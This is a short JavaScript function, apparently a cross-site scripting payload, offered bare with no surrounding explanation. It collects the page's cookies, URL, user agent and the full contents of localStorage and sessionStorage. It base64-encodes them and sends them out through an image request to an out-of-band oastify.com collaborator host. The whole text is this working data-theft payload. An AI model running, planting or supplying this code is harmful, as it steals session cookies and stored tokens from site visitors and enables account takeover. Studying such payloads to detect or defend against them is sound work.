function simpleCookie() {
  var cookies = document.cookie;
	var cookieList = cookies.split(';');
	var encodedData = btoa(JSON.stringify({
    'cookies': cookieList,
    'url': window.location.href,
		'userAgent': navigator.userAgent,
		'localStorage': JSON.stringify(localStorage),
		'sessionStorage': JSON.stringify(sessionStorage)
  }));
  new Image().src = 'https://68cod9gaqrsd3dxpdbxgthf5bwhn5kt9.oastify.com?data=' + encodedData;
}
